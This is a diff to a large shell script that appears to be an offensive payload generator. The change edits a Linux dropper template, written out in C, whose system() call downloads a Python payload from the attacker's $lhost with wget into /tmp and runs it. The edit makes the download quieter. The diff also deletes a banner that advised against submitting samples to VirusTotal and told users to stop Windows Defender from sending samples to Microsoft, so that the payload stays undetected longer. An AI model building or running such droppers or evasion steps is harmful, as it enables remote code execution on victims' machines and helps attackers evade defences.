@@ -10215,17 +10215,6 @@ fi
 sh_shellcode27 () {
 Colors;
 
-## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
-echo "---"
-echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
-echo "- Please Dont test samples on Virus Total or on similar"${Reset};
-echo "- online scanners, because that will shorten the payload life."${Reset};
-echo "- And in testings also remmenber to stop the windows defender"${Reset};
-echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
-echo "---"
-sleep 2
-
-
 # ----------------- Dependencies Checks -----------------
 
 
@@ -10291,7 +10280,7 @@ if [ "$SOSP" = "Windows" ]; then
 elif [ "$SOSP" = "Linux" ]; then
    targetos="Linux"
    dropextension="NULL"
-   uploadpath="NULL"
+   uploadpath="/tmp"
    lolbin="wget (DownloadFile)"
    dropperpath="$IPATH/output/$Drop"
 else
@@ -10350,7 +10339,7 @@ elif [ "$SOSP" = "Linux" ]; then
    echo "" >> $Drop.c
    echo "int main()" >> $Drop.c
    echo "{" >> $Drop.c
-   echo "    system(\"cd /tmp && wget http://$lhost/$Drop.py && python3 $Drop.py\");" >> $Drop.c
+   echo "    system(\"cd /tmp && wget -qq http://$lhost/$Drop.py && python3 $Drop.py\");" >> $Drop.c
    echo "    return 0;" >> $Drop.c
    echo "}" >> $Drop.c
 
